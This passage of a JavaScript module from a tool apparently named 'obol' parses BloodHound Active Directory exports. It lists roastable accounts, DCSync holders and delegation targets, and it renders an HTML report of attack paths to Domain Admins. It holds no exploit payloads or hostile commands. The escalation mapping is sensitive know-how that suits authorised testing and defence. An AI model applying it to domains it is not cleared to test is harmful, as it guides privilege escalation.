    + 'header h1{margin:0 0 4px;font-size:20px}header .sub{color:#aab4c8;font-size:12px}\n'
    + '.kpis{display:flex;flex-wrap:wrap;gap:10px;margin:14px 0 4px}\n'
    + '.kpi{background:#1c2542;border:1px solid #2b3557;border-radius:9px;padding:8px 12px;min-width:90px}\n'
    + '.kpi .n{font-size:18px;font-weight:700}.kpi .l{color:#9fb0d0;font-size:11px;text-transform:uppercase;letter-spacing:.06em}\n'
    + 'h2{font-size:15px;margin:26px 0 8px;padding-bottom:6px;border-bottom:2px solid var(--line)}\n'
    + '.hint{color:var(--muted);font-size:12.5px;margin:-2px 0 10px}\n'
    + '.analysis{background:#fff;border:1px solid var(--line);border-left:4px solid var(--accent);border-radius:10px;padding:14px 16px;margin:8px 0}\n'
    + '.chain{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px;margin:6px 0;display:flex;flex-wrap:wrap;gap:5px;align-items:center}\n'
    + '.node{background:#eef2ff;border:1px solid #cdd8ff;border-radius:6px;padding:2px 7px;white-space:nowrap}\n'
    + '.node.goal{background:#fdecea;border-color:#f1b0a8;color:var(--goal);font-weight:700}\n'
    + '.edge{color:var(--edge);font-size:11px}\n'
    + 'table{width:100%;border-collapse:collapse;background:#fff;border:1px solid var(--line);border-radius:10px;overflow:hidden;margin:6px 0 4px}\n'
    + 'th{background:#eef1f6;text-align:left;font-size:11px;letter-spacing:.05em;text-transform:uppercase;color:var(--muted);padding:8px 12px}\n'
    + 'td{padding:7px 12px;border-top:1px solid var(--line);font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px}\n'
    + '.cash{color:#1a7f52;font-size:11.5px;margin:2px 0 0}\n'
    + '.empty{color:var(--muted);font-style:italic;font-size:12.5px;padding:4px 0}\n'
    + 'footer{color:var(--muted);font-size:11px;margin-top:30px;text-align:center}\n'
    + '@media print{body{background:#fff}header{background:#12182a!important;-webkit-print-color-adjust:exact;print-color-adjust:exact}.wrap{max-width:none}}\n';

  function esc(s) {
    return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  }

  function fmtWhen(ts) {
    var d = new Date((ts || (Date.now() / 1000)) * 1000);
    function p(n) { return (n < 10 ? '0' : '') + n; }
    return d.getUTCFullYear() + '-' + p(d.getUTCMonth() + 1) + '-' + p(d.getUTCDate())
      + ' ' + p(d.getUTCHours()) + ':' + p(d.getUTCMinutes()) + ' UTC';
  }

  // A self-contained, printable PlumHound-style HTML report — the attack path(s) obol surmised
  // plus every high-value canned query. No external assets, no neo4j; opens in a browser or
  // downloads as one file. `view` is optional; when omitted it is computed from the summary.
  function domainReportHtml(summary, view) {
    summary = summary || {};
    var v = view || domainView(summary, summary.collected_owned || []);
    var dom = esc(v.domain || 'unknown');
    var when = fmtWhen(v.ingested_at);
    var an = v.analysis || {};
    var parts = [];
    if (!v.collected) parts.push('<div class="empty">No BloodHound collection ingested yet.</div>');
    if (an.headline) {
      parts.push('<h2>Attack analysis — route to Domain Admins</h2>');
      parts.push('<div class="analysis"><div>' + esc(an.headline) + '</div>');
      (an.paths || []).forEach(function (p, i) {
        var hops = p.hops || [];
        var chain = hops.length ? ('<span class="node">' + esc(hops[0].from) + '</span>') : '';
        hops.forEach(function (hop, idx) {
          var goal = idx === hops.length - 1 ? ' goal' : '';
          chain += '<span class="edge">─' + esc(hop.edge) + '▸</span>'
            + '<span class="node' + goal + '">' + esc(hop.to) + '</span>';
        });
        parts.push('<div class="chain"><b style="color:#5b6472">#' + (i + 1) + '</b> ' + chain + '</div>');
      });
      parts.push('</div>');
    }
    (v.sections || []).forEach(function (s) {
      parts.push('<h2>' + esc(s.title) + ' <span style="color:#9aa4b2;font-weight:400">· ' + s.count + '</span></h2>');
      parts.push('<div class="hint">' + esc(s.hint || '') + '</div>');
      if (s.count) {
        var rows = s.items.map(function (it) { return '<tr><td>' + esc(it) + '</td></tr>'; }).join('');
        parts.push('<table><tr><th>' + esc(s.title) + '</th></tr>' + rows + '</table>');
        if (s.cash) parts.push('<div class="cash">⚡ ' + esc(s.cash) + '</div>');
      } else {
        parts.push('<div class="empty">None in this collection.</div>');
      }
    });
    var kpis = '<div class="kpi"><div class="n">' + (v.users || 0) + '</div><div class="l">Users</div></div>';
    (v.sections || []).forEach(function (s) {
      if (['dcsync', 'unconstrained', 'adminto', 'asrep', 'kerberoast'].indexOf(s.id) >= 0 && s.count) {
        kpis += '<div class="kpi"><div class="n">' + s.count + '</div><div class="l">' + esc(s.title) + '</div></div>';
      }
    });
    return '<!doctype html><html><head><meta charset="utf-8">'
      + '<title>Domain analysis — ' + dom + '</title><style>' + REPORT_CSS + '</style></head><body><div class="wrap">'
      + '<header><h1>Domain analysis · ' + dom + '</h1>'
      + '<div class="sub">obol — BloodHound analysis &amp; escalation report · ingested ' + when + '</div>'
      + '<div class="kpis">' + kpis + '</div></header>'
      + parts.join('')
      + '<footer>Generated by obol from a BloodHound collection · every path is a lead over collected edges, '
      + 'not a claim it was walked.</footer></div></body></html>';
  }

  // ── fact minting (so the coach/graph can consume the ingest) ─────────────────────────────
  // Conservative: collecting the graph proves the graph was collected and names the domain — it
  // does NOT prove a usable control path. An ad.attack_paths fact is a LEAD (the edges exist),
  // never a claim it was walked. `paths` is the ownedPaths result — either the {paths, first}
  // object or the bare list of hop-chains.
  function toFacts(summary, paths, scope) {
    var F = OBOL.facts;
    if (!F) throw new Error('OBOL.facts (facts.js) must be loaded before bloodhound.js');
    summary = summary || {};
    scope = scope || (summary.domain ? 'domain:' + summary.domain : 'domain:unknown');
    var out = [];
    function mk(kind, value) {
      out.push(F.makeFact({ kind: kind, scope: scope, value: value, state: F.ProofState.SUPPORTED, source: 'bloodhound ingest' }));
    }
    mk('ad.graph.collected', {
      users: summary.users || 0,
      computers: (summary.computers || []).length,
      domain_admins: (summary.domain_admins || []).length,
      enterprise_admins: (summary.enterprise_admins || []).length,
    });
    if (summary.domain) mk('ad.domain_known', { name: summary.domain });

    // high-value census facts — one compact fact per high-signal category that matched.
    [['ad.kerberoastable', 'kerberoastable'], ['ad.asrep_roastable', 'asrep_roastable'],
     ['ad.dcsync_principals', 'dcsync_principals'], ['ad.unconstrained_delegation', 'unconstrained_delegation'],
     ['ad.high_value', 'high_value'], ['ad.esc_templates', 'esc_templates']].forEach(function (pair) {
      var items = summary[pair[1]] || [];
      if (items.length) mk(pair[0], { principals: items.slice(), count: items.length });
    });

    // attack paths (the LEAD) — shape matches bloodhound.py:902-908
    var chains = paths || [];
    var first = null;
    if (chains && !Array.isArray(chains)) { first = chains.first || null; chains = chains.paths || []; }
    if (chains && chains.length) {
      var shortest = chains[0];
      if (!first) first = firstAbusable(shortest);
      var value = {
        tool: 'bloodhound', evidence: 'reachability',
        path: shortest, paths: chains, goal: shortest[shortest.length - 1].to,
      };
      if (first) value.first_action = first;
      mk('ad.attack_paths', value);
    }
    return out;
  }

  // ── parse: unzip (browser/worker) or accept pre-extracted JSON, into a domain summary ──────
  function newSummary() {
    return {
      domain: '', users: 0, computers: [], domain_admins: [],
      enterprise_admins: [], kerberoastable: [], asrep_roastable: [],
      high_value: [], unconstrained_delegation: [], dcsync_principals: [],
      admin_to: [], da_sessions: [], password_not_required: [], pwd_never_expires: [],
      can_rdp: [], can_winrm: [],
      rdp_reach: [], psremote_reach: [], dcom_reach: [],
      foreign_principals: [], esc_templates: [],
      ingested_at: Date.now() / 1000, files: [],
      // transient reachability graph — used to derive census + owned→DA path, then dropped by
      // the caller before persisting (call dropGraph(summary)).
      _graph: newGraph(),
    };
  }

  var DEDUP_KEYS = ['computers', 'domain_admins', 'enterprise_admins', 'kerberoastable',
    'asrep_roastable', 'high_value', 'unconstrained_delegation', 'dcsync_principals',
    'admin_to', 'da_sessions', 'password_not_required', 'pwd_never_expires',
    'can_rdp', 'can_winrm', 'rdp_reach', 'psremote_reach', 'dcom_reach',
    'foreign_principals', 'esc_templates'];

  function dedupSorted(arr) {
    var seen = {}; var out = [];
    (arr || []).forEach(function (x) { var k = String(x); if (!(k in seen)) { seen[k] = 1; out.push(x); } });
    out.sort();
    return out;
  }

  // Resolve one upload {name, arrayBuffer|text|bytes} to its JSON text(s). A .zip yields many
  // (name, text) pairs via JSZip; a .json yields one. Returns a Promise<Array<[name, text]>>.
  function readUpload(file) {
    var name = file.name || '';
    var low = name.toLowerCase();
    if (low.slice(-4) === '.zip') {
      var JSZipRef = (typeof JSZip !== 'undefined') ? JSZip : (root.JSZip || (typeof globalThis !== 'undefined' && globalThis.JSZip));
      if (!JSZipRef) return Promise.reject(new Error('JSZip is required to read a .zip upload (vendored at assets/jszip.min.js)'));
      var buf = file.arrayBuffer || file.bytes;
      var loaded = (typeof buf === 'function') ? buf.call(file) : buf; // File.arrayBuffer() vs a raw buffer
      return Promise.resolve(loaded).then(function (ab) {
        return JSZipRef.loadAsync(ab).then(function (zip) {
          var jobs = [];
          Object.keys(zip.files).forEach(function (inner) {
            if (inner.toLowerCase().slice(-5) === '.json' && !zip.files[inner].dir) {
              jobs.push(zip.files[inner].async('text').then(function (txt) { return [inner, txt]; }));
            }
          });
          return Promise.all(jobs);
        });
      });
    }
    if (low.slice(-5) === '.json') {
      if (typeof file.text === 'string') return Promise.resolve([[name, file.text]]);
      if (typeof file.text === 'function') return Promise.resolve(file.text()).then(function (t) { return [[name, t]]; });
      var b = file.arrayBuffer || file.bytes;
      var pending = (typeof b === 'function') ? b.call(file) : b;
      return Promise.resolve(pending).then(function (ab) {
        var txt = decodeBytes(ab);
        return [[name, txt]];
      });
    }
    return Promise.resolve([]); // ignore anything that isn't a zip or json
  }

  function decodeBytes(ab) {
    if (typeof ab === 'string') return ab;
    if (typeof TextDecoder !== 'undefined') {
      return new TextDecoder('utf-8').decode(ab instanceof Uint8Array ? ab : new Uint8Array(ab));
    }
    if (typeof Buffer !== 'undefined') return Buffer.from(ab).toString('utf-8');
    // last resort
    var u8 = ab instanceof Uint8Array ? ab : new Uint8Array(ab);
    var s = ''; for (var i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
    return s;
  }

  // Parse one or more uploaded files (a .zip export, or individual .json files) into a domain
  // summary matching bloodhound.py:741-758. `files` is an array of {name, arrayBuffer|text}.
  // Async because unzipping is async; the JSON-only path never touches JSZip. The returned
  // summary retains its transient `_graph` so ownedPaths/deriveCensus can read it — call
  // OBOL.bloodhound.dropGraph(summary) before persisting.
  function parse(files) {
    var summary = newSummary();
    var list = files || [];
    return list.reduce(function (chain, file) {
      return chain.then(function () {
        return readUpload(file).then(function (pairs) {
          pairs.forEach(function (pair) {
            summary.files.push(pair[0]);
            mergeJson(summary, pair[0], pair[1]);
          });
        }).catch(function () { /* a bad zip / unreadable file is skipped, like the Python */ });
      });
    }, Promise.resolve()).then(function () {
      deriveCensus(summary);
      DEDUP_KEYS.forEach(function (k) { summary[k] = dedupSorted(summary[k]); });
      return summary;
    });
  }

  // A synchronous parse for callers that already hold the extracted JSON as text (no zip). Each
  // entry is {name, text}. Handy in the worker's importScripts-less fallback and in tests.
  function parseJson(jsonFiles) {
    var summary = newSummary();
    (jsonFiles || []).forEach(function (f) {
      if (!f || !f.name) return;
      if (f.name.toLowerCase().slice(-5) !== '.json') return;
      var text = typeof f.text === 'string' ? f.text : decodeBytes(f.arrayBuffer || f.bytes || '');
      summary.files.push(f.name);
      mergeJson(summary, f.name, text);
    });
    deriveCensus(summary);
    DEDUP_KEYS.forEach(function (k) { summary[k] = dedupSorted(summary[k]); });
    return summary;
  }

  function dropGraph(summary) {
    if (summary && summary._graph) { delete summary._graph; }
    return summary;
  }

  OBOL.bloodhound = {
    // constants (preserved from the Python)
    WELL_KNOWN_RID: WELL_KNOWN_RID,
    WELL_KNOWN_SID: WELL_KNOWN_SID,
    ABUSABLE_ACE: ABUSABLE_ACE,
    DCSYNC_RIGHTS: DCSYNC_RIGHTS,
    DCSYNC_OWNING: DCSYNC_OWNING,
    // parsing
    parse: parse,
    parseJson: parseJson,
    dropGraph: dropGraph,
    // analysis (pure)
    deriveCensus: deriveCensus,
    ownedPaths: ownedPaths,
    pathsToGraph: pathsToGraph,
    domainView: domainView,
    domainReportHtml: domainReportHtml,
    toFacts: toFacts,
    // low-level helpers (exposed for tests / advanced callers)
    prop: prop,
    resolveSid: resolveSid,
    isBroadPrincipal: isBroadPrincipal,
    domainOfSid: domainOfSid,
    firstAbusable: firstAbusable,
  };

  // CommonJS convenience for the Node smoke test (browser/worker ignore this).
  if (typeof module !== 'undefined' && module.exports) { module.exports = OBOL.bloodhound; }
})(typeof globalThis !== 'undefined' ? globalThis : this);
